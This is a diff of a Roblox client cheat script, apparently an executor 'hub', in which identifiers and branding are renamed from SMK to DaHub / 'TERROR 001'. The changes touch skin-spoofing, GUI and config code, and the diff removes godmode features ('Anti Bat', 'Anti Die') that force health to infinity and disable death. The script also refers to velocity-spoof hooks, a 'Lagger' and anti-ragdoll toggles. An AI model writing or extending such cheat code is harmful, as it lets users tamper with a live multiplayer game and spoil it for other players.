+    if originalMesh and originalHead:GetAttribute("DaHubOriginalHeadMesh")~=nil then
+        originalMesh.MeshId=originalHead:GetAttribute("DaHubOriginalHeadMesh")
+        originalMesh.TextureId=originalHead:GetAttribute("DaHubOriginalHeadTexture") or ""
     end
 
     -- Vanta quita los accesorios actuales y aplica la descripción completa primero.
     for _,child in ipairs(character:GetChildren()) do
         if child:IsA("Accessory") or child:IsA("Accoutrement") then pcall(function() child:Destroy() end) end
     end
-    local description=SMKDisplaySkin.buildDescription(setName,character)
-    if description then SMKDisplaySkin.applyDescription(humanoid,description) end
+    local description=DaHubDisplaySkin.buildDescription(setName,character)
+    if description then DaHubDisplaySkin.applyDescription(humanoid,description) end
     task.wait(0.18)
     if token~=S._skinApplyToken then if description then description:Destroy() end; return end
 
     -- Fallback directo: añade cada asset de la skin aunque ApplyDescription no lo adjunte.
-    for _,id in ipairs(setData.accessories or {}) do SMKDisplaySkin.addAsset(character,humanoid,id) end
-    for _,id in ipairs(setData.clothing or {}) do SMKDisplaySkin.addAsset(character,humanoid,id) end
+    for _,id in ipairs(setData.accessories or {}) do DaHubDisplaySkin.addAsset(character,humanoid,id) end
+    for _,id in ipairs(setData.clothing or {}) do DaHubDisplaySkin.addAsset(character,humanoid,id) end
     task.wait(0.35)
     if token~=S._skinApplyToken then if description then description:Destroy() end; return end
-    for _,id in ipairs(setData.accessories or {}) do SMKDisplaySkin.addAsset(character,humanoid,id) end
-    for _,id in ipairs(setData.clothing or {}) do SMKDisplaySkin.addAsset(character,humanoid,id) end
-    if description then SMKDisplaySkin.applyAccessories(character,humanoid,description,setData) end
+    for _,id in ipairs(setData.accessories or {}) do DaHubDisplaySkin.addAsset(character,humanoid,id) end
+    for _,id in ipairs(setData.clothing or {}) do DaHubDisplaySkin.addAsset(character,humanoid,id) end
+    if description then DaHubDisplaySkin.applyAccessories(character,humanoid,description,setData) end
     if description then description:Destroy() end
-    SMKDisplaySkin.markAndColor(character,setData)
+    DaHubDisplaySkin.markAndColor(character,setData)
     if setData.shirtTemplate then
         for _, item in ipairs(character:GetChildren()) do
             if item:IsA("Shirt") or item:IsA("Pants") then item:Destroy() end
         end
-        local shirt=Instance.new("Shirt",character); shirt.ShirtTemplate=setData.shirtTemplate; shirt:SetAttribute("SMKCompleteSkin",true)
-        local pants=Instance.new("Pants",character); pants.PantsTemplate=setData.pantsTemplate; pants:SetAttribute("SMKCompleteSkin",true)
+        local shirt=Instance.new("Shirt",character); shirt.ShirtTemplate=setData.shirtTemplate; shirt:SetAttribute("DaHubCompleteSkin",true)
+        local pants=Instance.new("Pants",character); pants.PantsTemplate=setData.pantsTemplate; pants:SetAttribute("DaHubCompleteSkin",true)
     end
     local head=character:FindFirstChild("Head")
     if setData.headMesh and head then
         local mesh=head:FindFirstChildOfClass("SpecialMesh")
         if mesh then
-            if head:GetAttribute("SMKOriginalHeadMesh")==nil then
-                head:SetAttribute("SMKOriginalHeadMesh",mesh.MeshId)
-                head:SetAttribute("SMKOriginalHeadTexture",mesh.TextureId)
+            if head:GetAttribute("DaHubOriginalHeadMesh")==nil then
+                head:SetAttribute("DaHubOriginalHeadMesh",mesh.MeshId)
+                head:SetAttribute("DaHubOriginalHeadTexture",mesh.TextureId)
             end
             mesh.MeshId=setData.headMesh
             mesh.TextureId=setData.headTexture or ""
         end
     end
-    SMKDisplaySkin.setHeadless(character,setData.headless==true)
-    if type(_G._SMKApplyKroblox)=="function" then pcall(_G._SMKApplyKroblox,setData.korblox or "Off") end
+    DaHubDisplaySkin.setHeadless(character,setData.headless==true)
+    if type(_G._DaHubApplyKroblox)=="function" then pcall(_G._DaHubApplyKroblox,setData.korblox or "Off") end
 end
 
-function SMKDisplaySkin.off()
+function DaHubDisplaySkin.off()
     local character=LP.Character; if not character then return end
     local humanoid=character:FindFirstChildOfClass("Humanoid")
     local head=character:FindFirstChild("Head")
     local mesh=head and head:FindFirstChildOfClass("SpecialMesh")
-    if mesh and head:GetAttribute("SMKOriginalHeadMesh")~=nil then
-        mesh.MeshId=head:GetAttribute("SMKOriginalHeadMesh")
-        mesh.TextureId=head:GetAttribute("SMKOriginalHeadTexture") or ""
-        head:SetAttribute("SMKOriginalHeadMesh",nil); head:SetAttribute("SMKOriginalHeadTexture",nil)
+    if mesh and head:GetAttribute("DaHubOriginalHeadMesh")~=nil then
+        mesh.MeshId=head:GetAttribute("DaHubOriginalHeadMesh")
+        mesh.TextureId=head:GetAttribute("DaHubOriginalHeadTexture") or ""
+        head:SetAttribute("DaHubOriginalHeadMesh",nil); head:SetAttribute("DaHubOriginalHeadTexture",nil)
     end
-    SMKDisplaySkin.clearMarked(character)
-    if humanoid and SMKOriginalDescriptions[character] then
-        SMKDisplaySkin.applyDescription(humanoid,SMKOriginalDescriptions[character]:Clone())
+    DaHubDisplaySkin.clearMarked(character)
+    if humanoid and DaHubOriginalDescriptions[character] then
+        DaHubDisplaySkin.applyDescription(humanoid,DaHubOriginalDescriptions[character]:Clone())
         task.wait(0.2)
     end
-    SMKDisplaySkin.restoreOriginalOutfit(character)
-    SMKDisplaySkin.setHeadless(character,false)
-    if type(_G._SMKApplyKroblox)=="function" then pcall(_G._SMKApplyKroblox,"Off") end
+    DaHubDisplaySkin.restoreOriginalOutfit(character)
+    DaHubDisplaySkin.setHeadless(character,false)
+    if type(_G._DaHubApplyKroblox)=="function" then pcall(_G._DaHubApplyKroblox,"Off") end
 end
-function SMKDisplaySkin.setSkin(name,save)
+function DaHubDisplaySkin.setSkin(name,save)
     S._skinApplyToken=S._skinApplyToken+1
     local myToken=S._skinApplyToken
     local valid=false; for _,v in ipairs(DAHUB_SKIN_ORDER) do if v==name then valid=true end end
     S.displaySkin=valid and name or "Off"
-    if S.displaySkin=="Off" then S.customSkinEnabled=false; SMKDisplaySkin.off() else S.customSkinEnabled=true; task.spawn(function() pcall(SMKDisplaySkin.apply,myToken) end) end
+    if S.displaySkin=="Off" then S.customSkinEnabled=false; DaHubDisplaySkin.off() else S.customSkinEnabled=true; task.spawn(function() pcall(DaHubDisplaySkin.apply,myToken) end) end
     if S.displaySkinSelectorLabel then S.displaySkinSelectorLabel.Text=S.displaySkin end
     if S.customSkinVisual then S.customSkinVisual(S.customSkinEnabled) end
     if save then saveConfig() end
 end
-function SMKDisplaySkin.cycleSkin(direction)
+function DaHubDisplaySkin.cycleSkin(direction)
     local index=1; for i,v in ipairs(DAHUB_SKIN_ORDER) do if v==S.displaySkin then index=i end end
     index=index+(direction or 1); if index<1 then index=#DAHUB_SKIN_ORDER end; if index>#DAHUB_SKIN_ORDER then index=1 end
-    SMKDisplaySkin.setSkin(DAHUB_SKIN_ORDER[index],true)
+    DaHubDisplaySkin.setSkin(DAHUB_SKIN_ORDER[index],true)
 end
-function SMKDisplaySkin.setCustom(on)
+function DaHubDisplaySkin.setCustom(on)
     S._skinApplyToken=S._skinApplyToken+1
     local myToken=S._skinApplyToken
     S.customSkinEnabled=on==true
-    if S.customSkinEnabled then if S.displaySkin=="Off" then S.displaySkin="PURPLE" end; task.spawn(function() SMKDisplaySkin.apply(myToken) end) else SMKDisplaySkin.off() end
+    if S.customSkinEnabled then if S.displaySkin=="Off" then S.displaySkin="PURPLE" end; task.spawn(function() DaHubDisplaySkin.apply(myToken) end) else DaHubDisplaySkin.off() end
     if S.customSkinVisual then S.customSkinVisual(S.customSkinEnabled) end
     if S.displaySkinSelectorLabel then S.displaySkinSelectorLabel.Text=S.displaySkin end
     saveConfig()
 end
-S.setDisplaySkin=SMKDisplaySkin.setSkin; S.cycleDisplaySkin=SMKDisplaySkin.cycleSkin; S.setCustomSkin=SMKDisplaySkin.setCustom
-S.applyDisplaySkin=function(token) return SMKDisplaySkin.apply(token) end
-LP.CharacterAdded:Connect(function(character) task.wait(0.4); SMKOriginalDescriptions[character]=nil; SMKOriginalOutfits[character]=nil; if S.customSkinEnabled and S.displaySkin~="Off" then task.spawn(SMKDisplaySkin.apply) end end)
+S.setDisplaySkin=DaHubDisplaySkin.setSkin; S.cycleDisplaySkin=DaHubDisplaySkin.cycleSkin; S.setCustomSkin=DaHubDisplaySkin.setCustom
+S.applyDisplaySkin=function(token) return DaHubDisplaySkin.apply(token) end
+LP.CharacterAdded:Connect(function(character) task.wait(0.4); DaHubOriginalDescriptions[character]=nil; DaHubOriginalOutfits[character]=nil; if S.customSkinEnabled and S.displaySkin~="Off" then task.spawn(DaHubDisplaySkin.apply) end end)
 end
 
 -- ==================== MYSTERY INFORMATION E01 ====================
 do
     local running = true
-    if type(_G._SMKInformationE01Cleanup) == "function" then
-        pcall(_G._SMKInformationE01Cleanup)
+    if type(_G._DaHubInformationE01Cleanup) == "function" then
+        pcall(_G._DaHubInformationE01Cleanup)
     end
     local introGeneration = 0
     local wasHoldingBrainrot = false
@@ -8281,7 +7659,7 @@ do
         if S.setInformationE01Visual then S.setInformationE01Visual(S.informationE01Enabled) end
         if persist ~= false then saveConfig() end
     end
-    _G._SMKInformationE01Cleanup = function()
+    _G._DaHubInformationE01Cleanup = function()
         running = false
         clearIntro()
     end
@@ -8478,171 +7856,6 @@ do
     end)
 end
 
--- ===== ANTI BAT (proteccion Anti Die integrada desde el script proporcionado) =====
-local function stopAntiBatProtection()
-    for _, connection in ipairs(S.antiBatConnections or {}) do
-        pcall(function() connection:Disconnect() end)
-    end
-    S.antiBatConnections = {}
-    if S.antiBatHeartbeat then
-        pcall(function() S.antiBatHeartbeat:Disconnect() end)
-        S.antiBatHeartbeat = nil
-    end
-    if S.antiBatCharacterConn then
-        pcall(function() S.antiBatCharacterConn:Disconnect() end)
-        S.antiBatCharacterConn = nil
-    end
-end
-
-local function protectAntiBatCharacter(character)
-    if not S.antiBatEnabled or not character then return end
-    local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
-    if not humanoid or not S.antiBatEnabled then return end
-    pcall(function()
-        humanoid.MaxHealth = math.huge
-        humanoid.Health = math.huge
-        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-    end)
-    table.insert(S.antiBatConnections, humanoid.StateChanged:Connect(function(_, newState)
-        if not S.antiBatEnabled or newState ~= Enum.HumanoidStateType.Dead then return end
-        pcall(function()
-            humanoid.Health = math.huge
-            humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-        end)
-    end))
-    table.insert(S.antiBatConnections, humanoid:GetPropertyChangedSignal("Health"):Connect(function()
-        if S.antiBatEnabled and humanoid.Parent and humanoid.Health < humanoid.MaxHealth then
-            pcall(function() humanoid.Health = math.huge end)
-        end
-    end))
-    S.antiBatHeartbeat = RunService.Heartbeat:Connect(function()
-        if S.antiBatEnabled and humanoid.Parent and humanoid.Health < humanoid.MaxHealth then
-            pcall(function() humanoid.Health = math.huge end)
-        end
-    end)
-end
-
-local function setAntiBatProtection(enabled)
-    S.antiBatEnabled = enabled == true
-    stopAntiBatProtection()
-    if not S.antiBatEnabled then return end
-    protectAntiBatCharacter(LP.Character)
-    S.antiBatCharacterConn = LP.CharacterAdded:Connect(function(character)
-        task.wait(0.1)
-        if S.antiBatEnabled then
-            for _, connection in ipairs(S.antiBatConnections) do
-                pcall(function() connection:Disconnect() end)
-            end
-            S.antiBatConnections = {}
-            if S.antiBatHeartbeat then S.antiBatHeartbeat:Disconnect(); S.antiBatHeartbeat = nil end
-            protectAntiBatCharacter(character)
-        end
-    end)
-end
-
--- 404 ANTI DROP integration: reuse SMK's existing velocity hook rather than
--- installing a second metatable hook that could conflict with movement.
-S.setAntiDrop = function(enabled, persist)
-    S.antiDropEnabled = enabled == true
-    if S.antiDropEnabled then
-        if S._vx7SetupHooks then pcall(S._vx7SetupHooks) end
-        local character = LP.Character
-        local root = character and character:FindFirstChild("HumanoidRootPart")
-        if root and S._vxSyncSpoof then
-            pcall(S._vxSyncSpoof, root.AssemblyLinearVelocity)
-        end
-    end
-    if persist ~= false and saveConfig then saveConfig() end
-    return S.antiDropEnabled
-end
-
--- 404 ANTI DIE: restore the character's original health settings when disabled.
-local antiDieConnections = {}
-local antiDieCharacterConnection = nil
-local antiDieSavedHumanoid = nil
-local antiDieOriginal = nil
-
-local function disconnectAntiDieCharacter()
-    for _, connection in ipairs(antiDieConnections) do
-        pcall(function() connection:Disconnect() end)
-    end
-    antiDieConnections = {}
-end
-
-local function restoreAntiDieHumanoid()
-    local humanoid, saved = antiDieSavedHumanoid, antiDieOriginal
-    if humanoid and humanoid.Parent and saved then
-        pcall(function()
-            humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, saved.deadEnabled)
-            humanoid.MaxHealth = saved.maxHealth
-            humanoid.Health = math.clamp(saved.health, 0, saved.maxHealth)
-        end)
-    end
-    antiDieSavedHumanoid, antiDieOriginal = nil, nil
-end
-
-local function protectAntiDieCharacter(character)
-    disconnectAntiDieCharacter()
-    restoreAntiDieHumanoid()
-    if not S.antiDieEnabled or not character then return end
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-        or character:WaitForChild("Humanoid", 5)
-    if not humanoid then return end
-
-    antiDieSavedHumanoid = humanoid
-    local ok, deadEnabled = pcall(function()
-        return humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
-    end)
-    antiDieOriginal = {
-        maxHealth = humanoid.MaxHealth,
-        health = humanoid.Health,
-        deadEnabled = ok and deadEnabled or true,
-    }
-
-    pcall(function()
-        humanoid.MaxHealth = math.huge
-        humanoid.Health = math.huge
-        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-    end)
-
-    antiDieConnections[#antiDieConnections + 1] =
-        humanoid:GetPropertyChangedSignal("Health"):Connect(function()
-            if S.antiDieEnabled and humanoid.Parent and humanoid.Health < humanoid.MaxHealth then
-                pcall(function() humanoid.Health = math.huge end)
-            end
-        end)
-
-    antiDieConnections[#antiDieConnections + 1] =
-        humanoid.StateChanged:Connect(function(_, newState)
-            if S.antiDieEnabled and newState == Enum.HumanoidStateType.Dead and humanoid.Parent then
-                pcall(function()
-                    humanoid.Health = math.huge
-                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-                end)
-            end
-        end)
-end
-
-S.setAntiDie = function(enabled, persist)
-    S.antiDieEnabled = enabled == true
-    if antiDieCharacterConnection then
-        antiDieCharacterConnection:Disconnect()
-        antiDieCharacterConnection = nil
-    end
-    disconnectAntiDieCharacter()
-    if S.antiDieEnabled then
-        protectAntiDieCharacter(LP.Character)
-        antiDieCharacterConnection = LP.CharacterAdded:Connect(function(character)
-            task.wait(0.1)
-            if S.antiDieEnabled then protectAntiDieCharacter(character) end
-        end)
-    else
-        restoreAntiDieHumanoid()
-    end
-    if persist ~= false and saveConfig then saveConfig() end
-    return S.antiDieEnabled
-end
-
 local function buildMainTab(pages)
     mkSection("Main", pages, "Information")
     S.setInformationE01Visual, _ = mkToggle("Main", pages, "Information E01", nil,
@@ -8668,7 +7881,7 @@ local function buildMainTab(pages)
         label.Position = UDim2.fromOffset(12, 5)
         label.Size = UDim2.new(1, -24, 0, 16)
         label.BackgroundTransparency = 1
-        label.Text = "ＳＭＫㅤＨＵＢ"
+        label.Text = "TERROR 001"
         label.TextColor3 = C_GREY
         label.Font = Enum.Font.GothamMedium
         label.TextSize = 10
@@ -8886,7 +8099,7 @@ local function buildMainTab(pages)
             if index < 1 then index = #options end
             if index > #options then index = 1 end
             local mode = options[index]
-            pcall(_G._SMKApplyKroblox, mode)
+            pcall(_G._DaHubApplyKroblox, mode)
             S.krobloxSelectorLabel.Text = mode
             saveConfig()
         end
@@ -9041,17 +8254,8 @@ local function buildMainTab(pages)
     S.setUnwalkVisual, _ = mkToggle("Main", pages, "Unwalk", nil, S.unwalkEnabled, function(on)
         if on then startUnwalk() else stopUnwalk() end; saveConfig()
     end, nil)
-    S.setAntiBatVisual, _ = mkToggle("Main", pages, "Anti Bat", nil, S.antiBatEnabled, function(on)
-        setAntiBatProtection(on); saveConfig()
-    end, nil)
     S.setAntiRagVisual, _ = mkToggle("Main", pages, "Anti Ragdoll", nil, S.antiRagdollEnabled, function(on)
         toggleAntiRag(on); saveConfig()
-    end, nil)
-    S.setAntiDropVisual, _ = mkToggle("Main", pages, "Anti Drop (404)", nil, S.antiDropEnabled, function(on)
-        S.setAntiDrop(on, true)
-    end, nil)
-    S.setAntiDieVisual, _ = mkToggle("Main", pages, "Anti Die (404)", nil, S.antiDieEnabled, function(on)
-        S.setAntiDie(on, true)
     end, nil)
 end
 
@@ -9219,16 +8423,16 @@ local function resetConfigToDefaults()
     S.optimizerMode = "standard"
     if S.setTripaVisual then S.setTripaVisual(false) end
     S.mobileButtonStyle = "original"
-    SMKBrandStyle.setFont("original",false)
+    DaHubBrandStyle.setFont("original",false)
     if S.setMedusaSkin then S.setMedusaSkin("Off",false) end
     if S.refreshMobileButtonStyleSelection then S.refreshMobileButtonStyleSelection() end
     if S.refreshMobileButtonShape then S.refreshMobileButtonShape() end
-    SMKApplyColorTheme(S.hubColor)
+    DaHubApplyColorTheme(S.hubColor)
     S.mobileButtonPositions = {}
     S.floatingFreeButtonPositions = {}
 
     pcall(applyCustomSky, "Off")
-    pcall(_G._SMKApplyKroblox, "Off")
+    pcall(_G._DaHubApplyKroblox, "Off")
     if S.displaySkinSelectorLabel then S.displaySkinSelectorLabel.Text="Off" end
     if S.customSkinVisual then S.customSkinVisual(false) end
     pcall(setUILock, false)
@@ -9238,7 +8442,7 @@ local function resetConfigToDefaults()
         local old = pg and pg:FindFirstChild("OpiumGGV5_2")
         if old then old.Enabled = true end
     end)
-    SMKBindings.refresh()
+    DaHubBindings.refresh()
     if S.speedClk then S.speedClk(false) end
     if S.setLaggerVisual then S.setLaggerVisual(false) end
     if S.setAntiRagVisual then S.setAntiRagVisual(false) end
@@ -9264,8 +8468,8 @@ end
 
 local function buildConfigTab(pages)
     mkSection("Config", pages, "General")
-    mkInput("Config", pages, "UI Scale", S.userMenuScale or 1, function(v) SMKSetUserScale("menu", v) end)
-    mkInput("Config", pages, "Mobile Buttons Scale", S.userMobileScale or 1, function(v) SMKSetUserScale("mobile", v) end)
+    mkInput("Config", pages, "UI Scale", S.userMenuScale or 1, function(v) DaHubSetUserScale("menu", v) end)
+    mkInput("Config", pages, "Mobile Buttons Scale", S.userMobileScale or 1, function(v) DaHubSetUserScale("mobile", v) end)
     S.setLockUI_Visual2, _ = mkToggle("Config", pages, "Lock UI", nil, S.lockUIEnabled or false, function(on)
         S.lockUIEnabled=on; setUILock(on); saveConfig()
     end, nil)
@@ -9339,11 +8543,11 @@ local function buildConfigTab(pages)
             choice.AutoButtonColor=false; choice.BorderSizePixel=0; Instance.new("UICorner",choice).CornerRadius=UDim.new(0.5,0)
             local stroke=Instance.new("UIStroke",choice); stroke.Color=C_BORDER; stroke.Transparency=0.65; stroke.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
             choices[option[1]]=choice
-            choice.Activated:Connect(function() SMKBrandStyle.setFont(option[1],true) end)
+            choice.Activated:Connect(function() DaHubBrandStyle.setFont(option[1],true) end)
         end
         S.refreshHubFontSelection=function()
             for id,choice in pairs(choices) do
-                local selected=SMKBrandStyle.fontMode==id
+                local selected=DaHubBrandStyle.fontMode==id
                 TS_G:Create(choice,TweenInfo.new(0.18),{
                     BackgroundColor3=selected and C_WHITE or C_CARD,
                     TextColor3=selected and C_BG or C_GREY,
@@ -9388,7 +8592,7 @@ local function buildConfigTab(pages)
         choices[colorId] = choice
         choice.Activated:Connect(function()
             S.hubColor = colorId
-            SMKApplyColorTheme(colorId)
+            DaHubApplyColorTheme(colorId)
             saveConfig()
         end)
     end
@@ -9401,7 +8605,7 @@ local function buildConfigTab(pages)
         button.Name = "ConfigManagement_" .. text:gsub("%s+", "")
         button.Size = UDim2.new(1, -20, 0.82, 0)
         button.Position = UDim2.new(0, 10, 0.09, 0)
-        button.BackgroundColor3 = SMKThemeRGB(255, 255, 255)
+        button.BackgroundColor3 = DaHubThemeRGB(255, 255, 255)
         button.BorderSizePixel = 0
         button.Text = ""
         button.AutoButtonColor = false
@@ -9412,39 +8616,39 @@ local function buildConfigTab(pages)
         gradient.Rotation = 90
         if mode == "save" then
             gradient.Color = ColorSequence.new({
-                ColorSequenceKeypoint.new(0.00, SMKThemeRGB(120, 120, 130)),
-                ColorSequenceKeypoint.new(0.50, SMKThemeRGB(60, 60, 70)),
-                ColorSequenceKeypoint.new(1.00, SMKThemeRGB(20, 20, 26)),
+                ColorSequenceKeypoint.new(0.00, DaHubThemeRGB(120, 120, 130)),
+                ColorSequenceKeypoint.new(0.50, DaHubThemeRGB(60, 60, 70)),
+                ColorSequenceKeypoint.new(1.00, DaHubThemeRGB(20, 20, 26)),
             })
         elseif mode == "reset" then
             gradient.Color = ColorSequence.new({
-                ColorSequenceKeypoint.new(0.00, SMKThemeRGB(80, 90, 110)),
-                ColorSequenceKeypoint.new(0.50, SMKThemeRGB(45, 55, 75)),
-                ColorSequenceKeypoint.new(1.00, SMKThemeRGB(18, 22, 32)),
+                ColorSequenceKeypoint.new(0.00, DaHubThemeRGB(80, 90, 110)),
+                ColorSequenceKeypoint.new(0.50, DaHubThemeRGB(45, 55, 75)),
+                ColorSequenceKeypoint.new(1.00, DaHubThemeRGB(18, 22, 32)),
             })
         else
             gradient.Color = ColorSequence.new({
-                ColorSequenceKeypoint.new(0.00, SMKThemeRGB(180, 45, 80)),
-                ColorSequenceKeypoint.new(0.50, SMKThemeRGB(120, 25, 55)),
-                ColorSequenceKeypoint.new(1.00, SMKThemeRGB(60, 10, 30)),
+                ColorSequenceKeypoint.new(0.00, DaHubThemeRGB(180, 45, 80)),
+                ColorSequenceKeypoint.new(0.50, DaHubThemeRGB(120, 25, 55)),
+                ColorSequenceKeypoint.new(1.00, DaHubThemeRGB(60, 10, 30)),
             })
         end
 
         local stroke = Instance.new("UIStroke", button)
         stroke.Thickness = 1.5
         stroke.Transparency = 0.35
-        stroke.Color = mode == "save" and SMKThemeRGB(200, 200, 215)
-            or mode == "reset" and SMKThemeRGB(150, 175, 210)
-            or SMKThemeRGB(255, 130, 170)
+        stroke.Color = mode == "save" and DaHubThemeRGB(200, 200, 215)
+            or mode == "reset" and DaHubThemeRGB(150, 175, 210)
+            or DaHubThemeRGB(255, 130, 170)
 
         local label = Instance.new("TextLabel", button)
         label.Size = UDim2.new(1, 0, 1, 0)
         label.BackgroundTransparency = 1
         label.Text = text
-        label.TextColor3 = SMKThemeRGB(255, 255, 255)
+        label.TextColor3 = DaHubThemeRGB(255, 255, 255)
         label.Font = Enum.Font.GothamBlack
         label.TextSize = 13
-        label.TextStrokeColor3 = SMKThemeRGB(0, 0, 0)
+        label.TextStrokeColor3 = DaHubThemeRGB(0, 0, 0)
         label.TextStrokeTransparency = 0.55
         label.ZIndex = 9
 
@@ -9494,18 +8698,18 @@ local function buildConfigTab(pages)
                     deleteState = 1
                     label.Text = "CONFIRM?"
                     gradient.Color = ColorSequence.new({
-                        ColorSequenceKeypoint.new(0.00, SMKThemeRGB(230, 70, 100)),
-                        ColorSequenceKeypoint.new(0.50, SMKThemeRGB(180, 40, 70)),
-                        ColorSequenceKeypoint.new(1.00, SMKThemeRGB(90, 15, 40)),
+                        ColorSequenceKeypoint.new(0.00, DaHubThemeRGB(230, 70, 100)),
+                        ColorSequenceKeypoint.new(0.50, DaHubThemeRGB(180, 40, 70)),
+                        ColorSequenceKeypoint.new(1.00, DaHubThemeRGB(90, 15, 40)),
                     })
                     task.delay(2, function()
                         if button and button.Parent and deleteState == 1 then
                             deleteState = 0
                             label.Text = text
                             gradient.Color = ColorSequence.new({
-                                ColorSequenceKeypoint.new(0.00, SMKThemeRGB(180, 45, 80)),
-                                ColorSequenceKeypoint.new(0.50, SMKThemeRGB(120, 25, 55)),
-                                ColorSequenceKeypoint.new(1.00, SMKThemeRGB(60, 10, 30)),
+                                ColorSequenceKeypoint.new(0.00, DaHubThemeRGB(180, 45, 80)),
+                                ColorSequenceKeypoint.new(0.50, DaHubThemeRGB(120, 25, 55)),
+                                ColorSequenceKeypoint.new(1.00, DaHubThemeRGB(60, 10, 30)),
                             })
                         end
                     end)
@@ -9518,9 +8722,9 @@ local function buildConfigTab(pages)
                         if label and label.Parent then
                             label.Text = text
                             gradient.Color = ColorSequence.new({
-                                ColorSequenceKeypoint.new(0.00, SMKThemeRGB(180, 45, 80)),
-                                ColorSequenceKeypoint.new(0.50, SMKThemeRGB(120, 25, 55)),
-                                ColorSequenceKeypoint.new(1.00, SMKThemeRGB(60, 10, 30)),
+                                ColorSequenceKeypoint.new(0.00, DaHubThemeRGB(180, 45, 80)),
+                                ColorSequenceKeypoint.new(0.50, DaHubThemeRGB(120, 25, 55)),
+                                ColorSequenceKeypoint.new(1.00, DaHubThemeRGB(60, 10, 30)),
                             })
                             deleteDebounce = false
                         end
@@ -9544,12 +8748,12 @@ end) -- close LP.CharacterAdded:Connect
 local function buildGui()
     S.mainMenuFrame = nil
     S.refreshHubColorSelection = nil
-    SMKApplyColorTheme(S.hubColor or DEFAULT_HUB_COLOR)
-    local old = game:GetService("CoreGui"):FindFirstChild("SMK")
+    DaHubApplyColorTheme(S.hubColor or DEFAULT_HUB_COLOR)
+    local old = game:GetService("CoreGui"):FindFirstChild("DaHub")
     if old then old:Destroy() end
 
     local gui = Instance.new("ScreenGui")
-    gui.Name = "SMK"; gui.ResetOnSpawn = false
+    gui.Name = "DaHub"; gui.ResetOnSpawn = false
     gui.DisplayOrder = 100; gui.IgnoreGuiInset = true
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
@@ -9605,7 +8809,7 @@ local function buildGui()
     menuBackgroundShade.ZIndex = 0
     menuBackgroundShade.Active = false
     local mainStroke = Instance.new("UIStroke", main)
-    mainStroke.Color = SMKThemeRGB(160, 160, 172); mainStroke.Thickness = 1.2; mainStroke.Transparency = 0.34
+    mainStroke.Color = DaHubThemeRGB(160, 160, 172); mainStroke.Thickness = 1.2; mainStroke.Transparency = 0.34
     mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
     -- Painel de cor sólida, sem imagens de fundo.
@@ -9622,59 +8826,54 @@ local function buildGui()
     end)
     local headerGrad = Instance.new("UIGradient", header)
     headerGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, SMKThemeRGB(65, 65, 74)),
-        ColorSequenceKeypoint.new(0.5, SMKThemeRGB(36, 36, 43)),
-        ColorSequenceKeypoint.new(1, SMKThemeRGB(19, 19, 24)),
+        ColorSequenceKeypoint.new(0, DaHubThemeRGB(65, 65, 74)),
+        ColorSequenceKeypoint.new(0.5, DaHubThemeRGB(36, 36, 43)),
+        ColorSequenceKeypoint.new(1, DaHubThemeRGB(19, 19, 24)),
     })
     headerGrad.Rotation = 90
     addPuren001Decorations(header, true)
 
-    local titleImage = Instance.new("TextLabel", header)
+    local titleImage = Instance.new("ImageLabel", header)
     titleImage.Name = "MenuTitleImage"
     titleImage.AnchorPoint = Vector2.new(0, 0.5)
-    titleImage.Position = UDim2.fromOffset(4, 36)
-    titleImage.Size = UDim2.fromOffset(240, 68)
-    titleImage.BackgroundTransparency = 1
-    titleImage.Text = SMKBrandStyle.text
-    titleImage.Font = Enum.Font.GothamBlack
-    titleImage.TextSize = 32
-    titleImage.TextColor3 = C_WHITE
-    titleImage.ZIndex = 6
-    SMKBrandStyle.apply(titleImage)
-
     titleImage.Position = UDim2.fromOffset(10, 36)
     titleImage.Size = UDim2.fromOffset(230, 68)
+    titleImage.BackgroundTransparency = 1
+    titleImage.Image = TERROR_LOGO_IMAGE
+    titleImage.ImageColor3 = C_WHITE
+    titleImage.ScaleType = Enum.ScaleType.Fit
+    titleImage.ZIndex = 6
 
     -- Close button (premium style)
     local closeBtn = Instance.new("TextButton", header)
     closeBtn.AnchorPoint = Vector2.new(1,0.5); closeBtn.Position = UDim2.fromOffset(PANEL_W-14,36)
-    closeBtn.Size = UDim2.fromOffset(30,30); closeBtn.BackgroundColor3 = SMKThemeRGB(28, 28, 28)
-    closeBtn.BorderSizePixel = 0; closeBtn.Text = "−"; closeBtn.TextColor3 = SMKThemeRGB(205, 205, 214)
+    closeBtn.Size = UDim2.fromOffset(30,30); closeBtn.BackgroundColor3 = DaHubThemeRGB(28, 28, 28)
+    closeBtn.BorderSizePixel = 0; closeBtn.Text = "−"; closeBtn.TextColor3 = DaHubThemeRGB(205, 205, 214)
     closeBtn.AutoButtonColor = false
     closeBtn.Font = Enum.Font.GothamBold; closeBtn.TextSize = 18; closeBtn.ZIndex = 10
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0,10)
     local closeBtnStroke = Instance.new("UIStroke", closeBtn)
-    closeBtnStroke.Color = SMKThemeRGB(59, 59, 59); closeBtnStroke.Thickness = 1; closeBtnStroke.Transparency = 0.3
+    closeBtnStroke.Color = DaHubThemeRGB(59, 59, 59); closeBtnStroke.Thickness = 1; closeBtnStroke.Transparency = 0.3
     closeBtn.MouseEnter:Connect(function()
         TS_G:Create(closeBtn,TweenInfo.new(0.15,Enum.EasingStyle.Quad),{BackgroundColor3=C_HIGHLIGHT,TextColor3=C_WHITE}):Play()
         TS_G:Create(closeBtnStroke,TweenInfo.new(0.15),{Color=C_HIGHLIGHT_BRIGHT,Transparency=0}):Play()
     end)
     closeBtn.MouseLeave:Connect(function()
-        TS_G:Create(closeBtn,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{BackgroundColor3=SMKThemeRGB(28, 28, 28),TextColor3=SMKThemeRGB(205, 205, 214)}):Play()
-        TS_G:Create(closeBtnStroke,TweenInfo.new(0.2),{Color=SMKThemeRGB(59, 59, 59),Transparency=0.3}):Play()
